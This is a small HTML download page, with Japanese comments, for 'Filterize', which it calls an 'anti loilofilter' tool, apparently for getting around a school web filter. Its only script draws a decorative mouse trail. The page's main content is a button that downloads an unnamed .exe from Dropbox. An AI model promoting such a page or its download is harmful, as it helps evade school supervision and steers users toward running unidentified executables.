<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Filterize - Download</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #111;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            font-family: 'Segoe UI', sans-serif;
        }

        /* 背景設定 */
        .bg-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: -2;
            overflow: hidden;
        }

        .bg-image {
            width: 110%;
            height: 110%;
            position: absolute;
            top: -5%;
            left: -5%;
            background-image: url('./背景.png'); 
            background-repeat: no-repeat;
            background-position: center;
            background-size: cover;
            filter: blur(20px) brightness(0.5);
        }

        /* --- アニメーションの設定 --- */
        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(50px); /* 50px下から開始 */
            }
            to {
                opacity: 1;
                transform: translateY(0); /* 定位置へ */
            }
        }

        .content {
            text-align: center;
            z-index: 10;
        }

        /* 各要素にアニメーションを適用 */
        h1 {
            font-size: clamp(3rem, 15vw, 6rem);
            margin: 0;
            background: linear-gradient(to bottom, #ffd1ff, #fbc2eb);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            
            /* アニメーション：名前 時間 動き 遅延 完了後の状態保持 */
            animation: slideUp 0.8s ease-out forwards;
        }

        .subtitle {
            font-size: 1.2rem;
            color: rgba(255,255,255,0.7);
            margin: 10px 0 40px 0;
            
            /* タイトルの少し後に動かす */
            animation: slideUp 0.8s ease-out 0.2s forwards;
            opacity: 0; /* 最初は隠しておく */
        }

        .btn {
            display: inline-block;
            padding: 18px 60px;
            border-radius: 15px;
            text-decoration: none;
            color: white;
            font-weight: bold;
            background: linear-gradient(135deg, #cf9fff 0%, #ff99cc 100%);
            box-shadow: 0 10px 30px rgba(207, 159, 255, 0.4);
            transition: 0.3s;

            /* さらに少し遅れて動かす */
            animation: slideUp 0.8s ease-out 0.4s forwards;
            opacity: 0;
        }

        .btn:hover {
            transform: translateY(-5px) scale(1.05);
            box-shadow: 0 15px 40px rgba(255, 153, 204, 0.6);
        }

        /* 残像（ドット） */
        .trail {
            position: fixed;
            width: 8px;
            height: 8px;
            background: #ff99cc;
            border-radius: 50%;
            pointer-events: none;
            z-index: 5;
            transition: transform 0.1s linear, opacity 0.5s ease-out;
        }
    </style>
</head>
<body>

    <div class="bg-container">
        <div class="bg-image"></div>
    </div>

    <div class="content">
        <h1>Filterize</h1>
        <p class="subtitle">The best anti loilofilter</p>
        <a href="https://www.dropbox.com/scl/fi/jhjaiww74lcgo741zqnng/.exe?rlkey=tv4zztnvfql4sd4c4nfsncioz&st=vwymdduv&dl=1" class="btn">
            Download Now
        </a>
    </div>

    <script>
        document.addEventListener('mousemove', (e) => {
            const trail = document.createElement('div');
            trail.className = 'trail';
            trail.style.left = e.pageX + 'px';
            trail.style.top = e.pageY + 'px';
            document.body.appendChild(trail);

            setTimeout(() => {
                trail.style.opacity = '0';
                trail.style.transform = 'scale(0)';
                setTimeout(() => trail.remove(), 500);
            }, 50);
        });
    </script>
</body>
</html>
